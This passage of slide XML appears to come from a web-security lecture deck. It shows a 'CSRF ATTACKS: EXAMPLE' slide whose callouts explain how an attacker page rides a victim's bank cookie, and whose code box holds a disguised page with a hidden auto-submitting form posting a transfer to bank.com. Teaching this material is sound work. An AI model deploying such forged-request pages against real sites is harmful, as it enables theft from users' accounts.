                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>legit</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>app,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> if </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>was</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-1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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>trying</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>perform</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>a </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>bank</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>transfer</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>attacker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24" name="object 24" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8214359" y="4994147"/>
            <a:ext cx="2830195" cy="1374775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006379"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00252F"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="124460" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" marL="156210" marR="146050" indent="-2540">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="980"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>❸</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>victim’s</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>browser </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>notices</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-6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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>request</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5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800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>is </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>going</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>legit</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>app,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>sends</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>auth</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> back</a:t>
            </a:r>
            <a:endParaRPr sz="1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170"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t>ATTACKS:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-175"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>EXAMPLE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="882396" y="1565147"/>
            <a:ext cx="10427335" cy="4802505"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10427335" h="4802505">
                <a:moveTo>
                  <a:pt x="0" y="4802124"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="10427208" y="4802124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10427208" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4802124"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35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 descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="1585036"/>
            <a:ext cx="10180320" cy="469074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solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-65">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="180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 sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;html</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>lang</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"en"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="262255">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;head&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;title&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Totally</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-45"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not</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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evil</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>page!</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/title&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="262255">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/head&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="262255">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;body&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;h1&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Oops,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40"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this</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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website</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20"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currently</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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down.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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Check</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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back</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>soon.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/h1&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;form</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-65">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>style</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"display:none;"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>method</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"POST"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>action</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"https://bank.com/transfer"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="763905">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"text"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"to"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"EvilZampurian"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="763905">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"number"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-45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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"amount"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"999.99"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="763905">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;input</a:t>
